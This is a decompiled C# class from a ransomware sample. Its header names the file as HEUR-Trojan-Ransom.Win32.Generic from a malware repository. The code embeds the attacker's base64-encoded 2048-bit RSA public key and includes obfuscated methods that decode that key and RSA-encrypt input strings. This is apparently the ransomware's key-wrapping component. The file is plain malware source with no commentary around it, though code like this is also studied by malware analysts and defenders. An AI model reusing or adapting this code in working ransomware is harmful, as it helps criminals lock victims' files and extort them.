// Decompiled with JetBrains decompiler
// Type: MufMaOSvGyvz.KcMVbmuWfLLu
// Assembly: Final-02.exe, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: C3A0FEE4-03D5-43E6-BB9B-FAFC16FEF04E
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.01-msil\HEUR-Trojan-Ransom.Win32.Generic-6a5090762c6058bc223e37e89f53832faad80995e3c5ed7e59ed9f5a5e604e47.exe

using System;
using System.Security.Cryptography;
using System.Text;

namespace MufMaOSvGyvz
{
  public static class KcMVbmuWfLLu
  {
    private static bool kCASXJgXoytAA = false;
    private static readonly string dnANbLvdgOINFG = "MjA0OCE8UlNBS2V5VmFsdWU+PE1vZHVsdXM+clNGdWRrWmRpQkRNVVkzRnNGcDFKQXVsYWR1Y1UrNkFjK1B4Z2ZLcks1TFM5V0Z6bGhPRHZWUWVlOXB6a0JMMHlURGdFSkUzMDRwd3RnK1c1WjVaZ29SaUdJL2owdnhuYlNxRUNHV3E2bzBMUmRxMTRVL3ZoT1hncW1xR2xrSkxRVldPb2MyKzZsYlh6OEw4TXZqaTNKc3BmTXZ5WnNFZyt1R1h3aTd3QXlyRnhCbzU2NEtqL2Y1b3NFWHFicm9obTdUci90S3FINE9aSm85VjJvYmF3b0ZEMHdyWHdvTlpUc0t3S2diWTFHdXdhVXpQYk1NMEJsdFZVdS8zN0V5UFYySnVYcFZybHZXYVowSVFnMzhGeFFvL3BsamYzMHlDdWh3Nmd1VEtaaVRJU0dHMW5rdzE5TlQyaS91TjFHQWRPTWFlVUhJY1FSeEZDcE8wczdSZEFRPT08L01vZHVsdXM+PEV4cG9uZW50PkFRQUI8L0V4cG9uZW50PjwvUlNBS2V5VmFsdWU+";

    public static string QKUAgIgehqhgaII(string string_0)
    {
      int cUJXpyhAdido = 0;
      string RDTkeNihkmvE = "";
      KcMVbmuWfLLu.kPyKyfjfqiSbKn(KcMVbmuWfLLu.dnANbLvdgOINFG, out cUJXpyhAdido, out RDTkeNihkmvE);
      return Convert.ToBase64String(KcMVbmuWfLLu.WlhScCxrQrX(Encoding.UTF8.GetBytes(string_0), cUJXpyhAdido, RDTkeNihkmvE));
    }

    private static byte[] WlhScCxrQrX(byte[] byte_0, int int_0, string string_0)
    {
      if ((byte_0 == null ? 0 : (byte_0.Length != 0 ? 1 : 0)) == 0)
        throw new ArgumentException("Data are empty", "data");
      int num = KcMVbmuWfLLu.BoSCJSlNmajL(int_0);
      if (byte_0.Length > num)
        throw new ArgumentException(string.Format("Maximum data length is {0}", (object) num), "data");
      if (!KcMVbmuWfLLu.LEIoJQVMxfkG(int_0))
        throw new ArgumentException("Key size is not valid", "keySize");
      if (string.IsNullOrEmpty(string_0))
        throw new ArgumentException("Key is null or empty", "publicKeyXml");
      using (RSACryptoServiceProvider cryptoServiceProvider = new RSACryptoServiceProvider(int_0))
      {
        cryptoServiceProvider.FromXmlString(string_0);
        return cryptoServiceProvider.Encrypt(byte_0, KcMVbmuWfLLu.kCASXJgXoytAA);
      }
    }

    private static int BoSCJSlNmajL(int int_0) => !KcMVbmuWfLLu.kCASXJgXoytAA ? (int_0 - 384) / 8 + 37 : (int_0 - 384) / 8 + 7;

    private static bool LEIoJQVMxfkG(int int_0) => int_0 >= 384 && int_0 <= 16384 && int_0 % 8 == 0;

    private static void kPyKyfjfqiSbKn(
      string BEKdDRtLICVXo,
      out int cUJXpyhAdido,
      out string RDTkeNihkmvE)
    {
      cUJXpyhAdido = 0;
      RDTkeNihkmvE = "";
      if ((BEKdDRtLICVXo == null ? 1 : (BEKdDRtLICVXo.Length <= 0 ? 1 : 0)) != 0)
        return;
      string str = Encoding.UTF8.GetString(Convert.FromBase64String(BEKdDRtLICVXo));
      if (!str.Contains("!"))
        return;
      string[] strArray = str.Split(new char[1]{ '!' }, 2);
      try
      {
        cUJXpyhAdido = int.Parse(strArray[0]);
        RDTkeNihkmvE = strArray[1];
      }
      catch (Exception ex)
      {
      }
    }
  }
}
